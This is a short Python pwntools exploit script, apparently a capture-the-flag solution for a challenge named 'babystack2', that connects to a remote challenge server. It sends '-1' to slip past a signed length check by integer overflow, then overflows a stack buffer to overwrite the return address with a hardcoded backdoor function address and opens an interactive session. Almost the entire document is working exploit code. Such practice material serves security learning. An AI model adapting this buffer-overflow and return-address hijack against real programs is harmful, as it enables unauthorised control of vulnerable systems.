from pwn import *
context.arch='amd64'

# this program's input was limited by the first input,
# and the judgement is 'if ( (signed int)nbytes > 10 )',
# so just do it by int overflow

# p = process('./babystack2')
p = remote('node3.buuoj.cn',27056)

payload = 'A'*(0x10+8)
payload += p64(0x0000000000400726) # backdoor's address
p.sendline('-1')
sleep(0.1)
p.send(payload)
p.interactive()
